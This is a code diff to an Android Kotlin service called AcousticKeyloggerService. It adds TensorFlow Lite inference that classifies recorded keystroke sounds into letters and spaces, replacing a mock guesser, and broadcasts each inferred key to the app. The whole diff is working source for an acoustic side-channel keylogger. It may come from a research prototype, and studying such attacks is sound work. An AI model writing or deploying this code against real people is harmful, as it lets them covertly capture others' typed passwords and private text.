@@ -21,6 +21,9 @@ import java.io.FileOutputStream
 import java.nio.ByteBuffer
 import java.nio.ByteOrder
 import android.Manifest
+import org.tensorflow.lite.Interpreter
+import java.io.FileInputStream
+import java.nio.channels.FileChannel
 import android.content.pm.PackageManager
 import androidx.core.content.ContextCompat
 
@@ -56,6 +59,7 @@ class AcousticKeyloggerService : Service() {
     private var keystrokeCount = 0
     private var isTrainingMode = false
     private var trainingKey = ""
+    private var tfliteInterpreter: Interpreter? = null
 
     private lateinit var keystrokeDetector: KeystrokeDetector
     private lateinit var calibrator: Calibrator
@@ -63,6 +67,12 @@ class AcousticKeyloggerService : Service() {
     override fun onCreate() {
         super.onCreate()
         createNotificationChannel()
+        try {
+            tfliteInterpreter = Interpreter(loadModelFile())
+            Log.i(TAG, "TFLite model loaded successfully")
+        } catch (e: Exception) {
+            Log.e(TAG, "Failed to load TFLite model: ${e.message}")
+        }
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
@@ -96,6 +106,8 @@ class AcousticKeyloggerService : Service() {
         broadcastStatus(STATE_STOPPED, 0)
         val manager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
         manager.cancel(NOTIFICATION_ID)
+        tfliteInterpreter?.close()
+        tfliteInterpreter = null
         super.onDestroy()
     }
 
@@ -221,7 +233,7 @@ class AcousticKeyloggerService : Service() {
             saveTrainingKeystroke(keystroke, trainingKey, timestamp)
             trainingKey
         } else {
-            getMockChar(peak)
+            predictKeystroke(keystroke) ?: getMockChar(peak)
         }
 
         // Broadcast to UI
@@ -234,6 +246,56 @@ class AcousticKeyloggerService : Service() {
             putExtra(EXTRA_IS_TRAINING, isTrainingMode)
         }
         sendBroadcast(intent)
+    }
+
+    private fun loadModelFile(): ByteBuffer {
+        val fileDescriptor = assets.openFd("keylogger_model.tflite")
+        val inputStream = FileInputStream(fileDescriptor.fileDescriptor)
+        val fileChannel = inputStream.channel
+        val startOffset = fileDescriptor.startOffset
+        val declaredLength = fileDescriptor.declaredLength
+        return fileChannel.map(FileChannel.MapMode.READ_ONLY, startOffset, declaredLength)
+    }
+
+    private fun predictKeystroke(keystroke: ShortArray): String? {
+        val interpreter = tfliteInterpreter ?: return null
+        return try {
+            // Model expects float32 raw waveform shape: [1, 13230, 1]
+            val inputVal = Array(1) { Array(13230) { FloatArray(1) } }
+            for (i in 0 until 13230) {
+                inputVal[0][i][0] = keystroke[i].toFloat() / 32768.0f // Normalize to [-1.0, 1.0]
+            }
+
+            // Model outputs class probabilities shape: [1, 27]
+            val outputVal = Array(1) { FloatArray(27) }
+
+            interpreter.run(inputVal, outputVal)
+
+            val probabilities = outputVal[0]
+            var maxIndex = 0
+            var maxProb = 0f
+            for (j in probabilities.indices) {
+                if (probabilities[j] > maxProb) {
+                    maxProb = probabilities[j]
+                    maxIndex = j
+                }
+            }
+
+            val labels = listOf(
+                "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", 
+                "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z", "space"
+            )
+
+            if (maxIndex in labels.indices) {
+                val key = labels[maxIndex]
+                if (key == "space") "[SPACE]" else key
+            } else {
+                null
+            }
+        } catch (e: Exception) {
+            Log.e(TAG, "TFLite inference failed: ${e.message}")
+            null
+        }
     }
 
     private fun getMockChar(peak: Int): String {
